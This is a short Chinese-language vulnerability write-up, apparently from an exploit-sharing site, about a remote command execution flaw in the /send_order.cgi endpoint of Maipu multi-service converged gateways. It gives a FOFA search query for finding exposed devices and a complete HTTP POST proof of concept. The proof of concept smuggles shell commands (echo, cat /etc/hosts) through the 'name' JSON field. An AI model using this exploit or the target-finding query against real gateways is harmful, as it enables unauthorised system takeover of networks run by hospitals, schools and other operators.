**fofa**

```
title="迈普多业务融合网关"
```

**一、漏洞简述**

迈普多业务融合网关拥有融合网关功能、精准流控、上网行为管理、智能选路…等强大功能，并支持对接迈普云平台，实现远程运维和集中管理，很好的满足了医疗/教育等场景要求的全面一体化的网络需求。其接口/send_order.cgi存在远程命令执行漏洞，攻击者可通过该漏洞获取系统权限。

**二、漏洞检测poc**

```yaml
POST /send_order.cgi?parameter=operation HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 67

{"opid":"1","name":";echo -n klmns:;cat /etc/hosts;","type":"rest"}
```

